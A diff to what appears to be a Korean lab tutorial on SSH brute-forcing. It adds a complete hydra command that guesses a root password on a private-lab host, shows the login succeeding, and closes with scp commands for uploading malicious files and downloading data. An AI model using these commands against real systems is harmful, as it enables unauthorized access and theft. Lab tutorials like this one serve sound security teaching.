@@ -61,4 +61,13 @@ ____
 + -V : login + 비밀번호 Vision
 + -f : 비밀번호 발견시 종료
 
-`hydra -l root 4:4:1 
+`hydra -l root -x 4:4:1 192.168.203.130 ssh -V -f` 
+
+![passwd suc](https://user-images.githubusercontent.com/78135526/120061475-66f7a600-c098-11eb-9d33-5a8759f1a12f.png)
+
+임의로 변경했던 PASSWORD : 0123이 확인이 된다. `ssh root@[대상자 IP]`로 접속을 시도한다. 우리가 알아낸 PASSWORD를 입력하면 대상 컴퓨터에 접속이 가능해진다. 대상 컴퓨터에 작성했던 SSH.TXT를 확인해본다.
+
+![FINLA](https://user-images.githubusercontent.com/78135526/120061567-d2417800-c098-11eb-975d-572fde79a456.png)
+
+SSH brute force attack 성공한 것을 알 수 있다.    
+이후 다운로드 : `scp 아이디@[대상자 IP]:[서버경로][로컬경로]` || 업로드 : `scp [로컬경로]아이디@[대상자 IP]:[서버경로]`를 통해 악성파일을 업로드, 실행, 주요 자료 다운 등이 가능하다.
